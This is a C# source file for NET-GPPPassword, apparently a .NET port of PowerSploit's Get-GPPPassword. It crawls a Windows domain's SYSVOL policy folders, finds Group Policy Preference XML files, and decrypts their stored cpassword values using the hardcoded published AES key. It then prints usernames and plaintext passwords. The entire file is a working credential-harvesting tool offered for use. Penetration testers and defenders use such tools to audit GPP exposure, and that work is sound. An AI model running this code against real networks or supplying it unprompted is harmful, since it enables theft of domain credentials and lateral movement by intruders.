﻿// NET-GPPPassword 
//
// .NET port of Get-GPPPassword
// Author: Stan Hegt (@StanHacked) / Outflank
// Version: 1.0
//
// Original PowerShell implementation: https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1

using System;
using System.IO;
using System.Xml;
using System.Text;
using System.Security.Cryptography;

namespace Net_GPPPassword
{
    class Program
    {
        static void Main(string[] args)
        {
            string domain;
            if (args.Length > 0)
            {
                // Set AD domain to argument
                domain = args[0];
            }
            else
            {
                // Retrieve AD domain from environment variable
                domain = Environment.GetEnvironmentVariable("USERDNSDOMAIN");
            }
        
            if (String.IsNullOrEmpty(domain))
            {
                Console.WriteLine("Machine is not part of domain - exit.");
                return;
            }

            string path = "\\\\" + domain + "\\sysvol\\" + domain + "\\policies\\";

            Console.WriteLine("Processing files in {0}", path);

            ProcessAllFiles(path, ProcessFile);

            Console.WriteLine("Finished processing!");
        }

        static string DecryptCPassword(string cPassword)
        {
            // Appropriate padding based on string length  
            int mod = cPassword.Length % 4;
            switch (mod)
            {
                case 1:
                    cPassword = cPassword.Substring(0, cPassword.Length - 1);
                    break;
                case 2: 
                    cPassword += "==";
                    break;
                case 3: 
                    cPassword += "=";
                    break;
            }

            // See https://adsecurity.org/?p=2288 for an explanation on this key
            byte[] aesKey = { 0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
                                 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b };
            byte[] aesIV = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };

            RijndaelManaged rijn = new RijndaelManaged();

            using (MemoryStream msDecrypt = new MemoryStream(Convert.FromBase64String(cPassword)))
            {
                using (ICryptoTransform decryptor = rijn.CreateDecryptor(aesKey, aesIV))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader swDecrypt = new StreamReader(csDecrypt))
                        {
                             return Encoding.Unicode.GetString((Encoding.UTF8.GetBytes(swDecrypt.ReadToEnd())));
                        }
                    }
                }
            }
        }

        static void ProcessFile(string path)
        {
            Console.WriteLine("Parsing file: {0}", path);

            XmlDocument xml = new XmlDocument();
            try
            {
                xml.Load(path);
            }
            catch
            {
                Console.WriteLine("Error parsing {0}", path);
                return;
            }

            string resultPrefixString = "[RESULT] ";
            XmlNodeList xnList;
            switch (Path.GetFileName(path).ToLower())
            {
                case "groups.xml":
                    xnList = xml.SelectNodes("/Groups/User/Properties");
                    foreach (XmlNode xn in xnList)
                    {
                       try
                        {
                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["userName"].Value);
                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
                        }
                        catch
                        {
                            // Swallow
                        }
                    }
                    break;
                case "services.xml":
                    xnList = xml.SelectNodes("/NTServices/NTService/Properties");
                    foreach (XmlNode xn in xnList)
                    {
                        try
                        {
                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["accountName"].Value);
                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
                        }
                        catch
                        {
                            // Swallow
                        }
                    }
                    break;
                case "scheduledtasks.xml":
                    xnList = xml.SelectNodes("/ScheduledTasks/Task/Properties");
                    foreach (XmlNode xn in xnList)
                    {
                        try
                        {
                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["runAs"].Value);
                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
                        }
                        catch
                        {
                            // Swallow
                        }
                    }
                    break;
                case "datasources.xml":
                    xnList = xml.SelectNodes("/DataSources/DataSource/Properties");
                    foreach (XmlNode xn in xnList)
                    {
                        try
                        {
                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["username"].Value);
                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
                        }
                        catch
                        {
                            // Swallow
                        }
                    }
                    break;
                case "printers.xml":
                    xnList = xml.SelectNodes("/Printers/SharedPrinter/Properties");
                    foreach (XmlNode xn in xnList)
                    {
                        try
                        {
                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["username"].Value);
                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
                        }
                        catch
                        {
                            // Swallow
                        }
                    }
                    break;
                case "drives.xml":
                    xnList = xml.SelectNodes("/Drives/Drive/Properties");
                    foreach (XmlNode xn in xnList)
                    {
                        try
                        {
                            Console.WriteLine("{0} Username: {1}", resultPrefixString, xn.Attributes["username"].Value);
                            Console.WriteLine("{0} Changed:  {1}", resultPrefixString, xn.ParentNode.Attributes["changed"].Value);
                            Console.WriteLine("{0} Password: {1}", resultPrefixString, DecryptCPassword(xn.Attributes["cpassword"].Value));
                        }
                        catch
                        {
                            // Swallow
                        }
                    }
                    break;
            }
        }

        // This function recursively walks through a directory. This is the best
        // way to search the Policies directory which might contain dirs that
        // we cannot access (which would throw an exception if we would simply
        // search using SearchOption.AllDirectories).
        static void ProcessAllFiles(string folder, Action<string> fileAction)
        {
            foreach (string file in Directory.GetFiles(folder))
            {
                if (file.EndsWith(".xml"))
                {
                    fileAction(file);
                }
            }
            foreach (string subDir in Directory.GetDirectories(folder))
            {
                try
                {
                    ProcessAllFiles(subDir, fileAction);
                }
                catch
                {
                    // Swallow
                }
            }
        }
    }
}
